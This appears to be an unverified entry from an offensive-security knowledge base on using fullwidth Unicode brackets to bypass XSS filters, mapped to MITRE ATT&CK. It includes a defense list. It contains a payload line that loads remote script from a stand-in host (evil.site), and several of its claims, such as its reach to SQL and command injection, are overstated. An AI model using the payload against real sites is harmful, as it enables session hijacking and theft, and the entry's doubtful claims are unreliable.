---
id: 4216b76d-1be1-44aa-b9c3-518b09e644af
name: Unicode Character Injection for XSS Filter Bypass
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:42.823434+00:00'
updated_at: '2023-04-10T20:21:52.674397+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Indirect Command Execution|T1202 - Indirect Command Execution]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
tags:
- '[[Bypass "<" and ">" using ＜ and ＞]]'
- '[[Cross Site Scripting]]'
- '[[Filter Bypass and exotic payloads]]'
---

# Unicode Character Injection for XSS Filter Bypass

## Summary

Unicode character injection is a technique used to bypass XSS filters that sanitize user input by replacing the < and > characters with their corresponding HTML entities. Instead of using the traditional < and > characters, the attacker can use their full-width equivalents ＜ and ＞, which are not re

## Description

# Description

Unicode character injection is a technique used to bypass XSS filters that sanitize user input by replacing the < and > characters with their corresponding HTML entities. Instead of using the traditional < and > characters, the attacker can use their full-width equivalents ＜ and ＞, which are not recognized by the filter. This allows the attacker to inject malicious code into the web page and execute it in the context of the victim's browser.

From a technical perspective, this technique works by taking advantage of the fact that some web applications use Unicode character encoding to represent user input. By using full-width characters, the attacker can evade the filters that are designed to detect and block traditional XSS payloads. 

The business value of this technique is that it allows an attacker to execute arbitrary code in the context of a victim's browser, potentially stealing sensitive information, hijacking user sessions, or delivering malware.

 

## Requirements

1. Access to a web application that uses Unicode character encoding for user input

1. Knowledge of the full-width equivalents of the < and > characters

 

## Defense

1. Implement input validation on the server-side to prevent malicious input from being processed by the application

1. Use a Content Security Policy (CSP) to restrict the types of content that can be loaded in the web page

1. Regularly update and patch the web application to address known vulnerabilities

 

## Objectives

1. Inject and execute arbitrary code on a victim's browser

1. Steal sensitive information

1. Hijack user sessions

1. Deliver malware

 

# Instructions

1. To perform a Unicode Character Injection attack, an attacker can use characters such as U+FF1C and U+FF1E to bypass input validation and inject malicious code into a web application. This can be used to steal sensitive information, perform unauthorized actions, or take control of the affected system.

 



**Code**: [[＜script/src=//evil.site/poc.js＞]]



> The U+FF1C and U+FF1E characters are fullwidth less-than and greater-than signs, respectively. These characters can be used to bypass input validation that only checks for the standard ASCII less-than and greater-than signs. By using these characters, an attacker can inject malicious code into a web application that may be executed by the browser or server. This can be used to perform a variety of attacks, such as cross-site scripting (XSS), SQL injection, or command injection. To prevent Unicode Character Injection attacks, input validation should include checks for these and other non-standard characters that may be used to bypass validation.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Indirect Command Execution|T1202 - Indirect Command Execution]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]

## Tags

- [[Bypass "<" and ">" using ＜ and ＞]]
- [[Cross Site Scripting]]
- [[Filter Bypass and exotic payloads]]


